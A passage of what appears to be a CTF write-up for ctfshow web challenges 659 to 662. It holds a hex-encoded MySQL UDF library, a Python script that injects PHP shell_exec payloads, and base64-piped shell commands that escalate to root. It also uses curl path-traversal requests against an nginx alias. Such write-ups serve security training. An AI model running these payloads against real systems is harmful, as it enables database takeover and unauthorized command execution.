696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e8162000</span><span class=se>\&#39;</span><span class=s1>));&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;file&#39;</span><span class=p>:</span><span class=s1>&#39;../db/data_you_never_know.db&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;key&#39;</span><span class=p>:</span><span class=s1>&#39;key_is_here_you_know&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;a.php&#34;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>data3</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;1&#39;</span><span class=p>:</span><span class=s2>&#34;shell_exec(&#39;cp /var/www/html/udf.so /usr/lib/mariadb/plugin/udf.so&#39;);&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;file&#39;</span><span class=p>:</span><span class=s1>&#39;../db/data_you_never_know.db&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;key&#39;</span><span class=p>:</span><span class=s1>&#39;key_is_here_you_know&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;a.php&#34;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;a.php&#34;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;1&#39;</span><span class=p>:</span><span class=s1>&#39;`mysql -uroot -proot -e &#34;create function sys_eval returns string soname </span><span class=se>\&#39;</span><span class=s1>udf.so</span><span class=se>\&#39;</span><span class=s1>&#34;`;&#39;</span><span class=p>})</span>
</span></span><span class=line><span class=cl><span class=n>cmd</span><span class=o>=</span><span class=s1>&#39;&#39;&#39;mysql -uroot -proot -e &#34;select sys_eval(&#39;sudo cat /root/you_win&#39;)&#34;&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>cmd</span><span class=o>=</span><span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>cmd</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>datax</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;1&#39;</span><span class=p>:</span><span class=s1>&#39;echo `echo </span><span class=si>{0}</span><span class=s1>|base64 -d|sh`;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>cmd</span><span class=p>)}</span>
</span></span><span class=line><span class=cl><span class=n>r1</span><span class=o>=</span><span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;a.php&#34;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>datax</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r1</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>curl http://172.2.95.5/robots.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>curl http://172.2.95.5/public/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;head&gt;&lt;title&gt;Index of /public/&lt;/title&gt;&lt;/head&gt;
</span></span><span class=line><span class=cl>&lt;body&gt;
</span></span><span class=line><span class=cl>&lt;h1&gt;Index of /public/&lt;/h1&gt;&lt;hr&gt;&lt;pre&gt;&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;../&#34;</span>&gt;../&lt;/a&gt;
</span></span><span class=line><span class=cl>&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;Readme.txt&#34;</span>&gt;Readme.txt&lt;/a&gt;                                         07-Aug-2021 19:51                 <span class=m>123</span>
</span></span><span class=line><span class=cl>&lt;/pre&gt;&lt;hr&gt;&lt;/body&gt;
</span></span><span class=line><span class=cl>&lt;/html&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>curl http://172.2.95.5/public/Readme.txt
</span></span><span class=line><span class=cl>没有flag继续
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>curl http://172.2.95.5/public../
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;head&gt;&lt;title&gt;Index of /public../&lt;/title&gt;&lt;/head&gt;
</span></span><span class=line><span class=cl>&lt;body&gt;
</span></span><span class=line><span class=cl>&lt;h1&gt;Index of /public../&lt;/h1&gt;&lt;hr&gt;&lt;pre&gt;&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;../&#34;</span>&gt;../&lt;/a&gt;
</span></span><span class=line><span class=cl>&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;FLAG/&#34;</span>&gt;FLAG/&lt;/a&gt;                                              07-Aug-2021 19:51                   -
</span></span><span class=line><span class=cl>&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;bin/&#34;</span>&gt;bin/&lt;/a&gt;                                               07-Aug-2021 19:51                   -
</span></span><span class=line><span class=cl>&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;dev/&#34;</span>&gt;dev/&lt;/a&gt;                                               24-Sep-2024 08:35                   -
</span></span><span class=line><span class=cl>&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;etc/&#34;</span>&gt;etc/&lt;/a&gt;                                               24-Sep-2024 08:35                   -
</span></span><span class=line><span class=cl>&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;home/&#34;</span>&gt;home/&lt;/a&gt;                                              07-Aug-2021 19:51                   -
</span></span><span class=line><span class=cl>&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;lib/&#34;</span>&gt;lib/&lt;/a&gt;                                               22-Sep-2020 08:25                   -
</span></span><span class=line><span class=cl>&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;media/&#34;</span>&gt;media/&lt;/a&gt;                                             29-May-2020 14:20                   -
</span></span><span class=line><span class=cl>&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;mnt/&#34;</span>&gt;mnt/&lt;/a&gt;                                               29-May-2020 14:20                   -
</span></span><span class=line><span class=cl>&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;opt/&#34;</span>&gt;opt/&lt;/a&gt;                                               29-May-2020 14:20                   -
</span></span><span class=line><span class=cl>&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;proc/&#34;</span>&gt;proc/&lt;/a&gt;                                              24-Sep-2024 08:35                   -
</span></span><span class=line><span class=cl>&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;public/&#34;</span>&gt;public/&lt;/a&gt;                                            07-Aug-2021 19:51                   -
</span></span><span class=line><span class=cl>&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;root/&#34;</span>&gt;root/&lt;/a&gt;                                              07-Aug-2021 19:51                   -
</span></span><span class=line><span class=cl>&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;run/&#34;</span>&gt;run/&lt;/a&gt;                                               07-Aug-2021 19:51                   -
</span></span><span class=line><span class=cl>&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;sbin/&#34;</span>&gt;sbin/&lt;/a&gt;                                              22-Sep-2020 08:25                   -
</span></span><span class=line><span class=cl>&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;srv/&#34;</span>&gt;srv/&lt;/a&gt;                                               29-May-2020 14:20                   -
</span></span><span class=line><span class=cl>&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;sys/&#34;</span>&gt;sys/&lt;/a&gt;                                               24-Sep-2024 08:35                   -
</span></span><span class=line><span class=cl>&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;tmp/&#34;</span>&gt;tmp/&lt;/a&gt;                                               24-Sep-2024 08:40                   -
</span></span><span class=line><span class=cl>&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;usr/&#34;</span>&gt;usr/&lt;/a&gt;                                               07-Aug-2021 19:51                   -
</span></span><span class=line><span class=cl>&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;var/&#34;</span>&gt;var/&lt;/a&gt;                                               07-Aug-2021 19:51                   -
</span></span><span class=line><span class=cl>&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;FLAG665&#34;</span>&gt;FLAG665&lt;/a&gt;                                            07-Aug-2021 19:51                  <span class=m>51</span>
</span></span><span class=line><span class=cl>&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;getflag&#34;</span>&gt;getflag&lt;/a&gt;                                            07-Aug-2021 19:51               <span class=m>19912</span>
</span></span><span class=line><span class=cl>&lt;/pre&gt;&lt;hr&gt;&lt;/body&gt;
</span></span><span class=line><span class=cl>&lt;/html&gt;
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>curl http://172.2.95.5/public../FLAG/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>curl http://172.2.95.5/public../FLAG/flag659.txt
</span></span></code></pre></td></tr></table></div></div><h1 id=web665>web665</h1><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>curl http://172.2.95.5/public../FLAG665
</span></span></code></pre></td></tr></table></div></div><h1 id=web660>web660</h1><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>login</span><span class=p>(</span><span class=nv>$u</span><span class=p>,</span><span class=nv>$p</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$ret</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;code&#39;</span><span class=o>=&gt;</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;message&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;数据获取失败&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nv>$u</span> <span class=o>=</span> <span class=nx>addslashes</span><span class=p>(</span><span class=nv>$u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nv>$p</span> <span class=o>=</span> <span class=nx>addslashes</span><span class=p>(</span><span class=nv>$p</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nv>$res</span> <span class=o>=</span> <span class=nx>db</span><span class=o>::</span><span class=na>query</span><span class=p>(</span><span class=s2>&#34;select username from ctfshow_users where username = &#39;</span><span class=si>$u</span><span class=s2>&#39; and password = &#39;</span><span class=si>$p</span><span class=s2>&#39;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nv>$date</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DateTime</span><span class=p>(</span><span class=s1>&#39;now&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nv>$now</span> <span class=o>=</span> <span class=nv>$date</span><span class=o>-&gt;</span><span class=na>format</span><span class=p>(</span><span class=s1>&#39;Y-m-d H:i:s&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nv>$ip</span> <span class=o>=</span> <span class=nx>addslashes</span><span class=p>(</span><span class=nx>gethostbyname</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class=p>]));</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>count</span><span class=p>(</span><span class=nv>$res</span><span class=p>)</span><span class=o>==</span><span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl> 		 <span class=nx>db</span><span class=o>::</span><span class=na>insert</span><span class=p>(</span><span class=s2>&#34;insert into `ctfshow_logs` (`username`,`login_time`,`login_ip`) values (&#39;</span><span class=si>$u</span><span class=s2>&#39;,&#39;</span><span class=si>$now</span><span class=s2>&#39;,&#39;</span><span class=si>$ip</span><span class=s2>&#39;)&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		 <span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span><span class=o>=</span><span class=s1>&#39;账号或密码错误&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		 <span class=k>return</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>auth</span><span class=p>()){</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span><span class=o>=</span><span class=s1>&#39;AuthKey 错误&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span><span class=o>=</span><span class=s1>&#39;登陆成功&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;login&#39;</span><span class=p>]</span><span class=o>=</span><span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;flag_660&#39;</span><span class=p>]</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;flag&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>会存储<code>flag</code>那么是可以直接从日志里面拿到的，这个姿势牛</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>curl</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>172.2</span><span class=o>.</span><span class=mf>95.5</span><span class=o>/</span><span class=n>public</span><span class=o>../</span><span class=k>var</span><span class=o>/</span><span class=nb>log</span><span class=o>/</span><span class=n>nginx</span><span class=o>/</span><span class=n>ctfshow_web_error_log_file_you_never_know</span><span class=o>.</span><span class=n>log</span>
</span></span><span class=line><span class=cl><span class=err>没读到在报错日志里面</span>
</span></span><span class=line><span class=cl><span class=n>curl</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>172.2</span><span class=o>.</span><span class=mf>95.5</span><span class=o>/</span><span class=n>public</span><span class=o>../</span><span class=k>var</span><span class=o>/</span><span class=nb>log</span><span class=o>/</span><span class=n>nginx</span><span class=o>/</span><span class=n>ctfshow_web_access_log_file_you_never_know</span><span class=o>.</span><span class=n>log</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=web661>web661</h1><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>curl http://172.2.95.5/public../
</span></span><span class=line><span class=cl>继续找
</span></span><span class=line><span class=cl>curl http://172.2.95.5/public../home/
</span></span><span class=line><span class=cl>curl http://172.2.95.5/public../home/flag/
</span></span><span class=line><span class=cl>curl http://172.2.95.5/public../home/flag/secret.txt
</span></span></code></pre></td></tr></table></div></div><h1 id=web662>web662</h1><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl http://172.2.95.5/public../home/www-data/creater.sh
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#!/bin/sh</span>
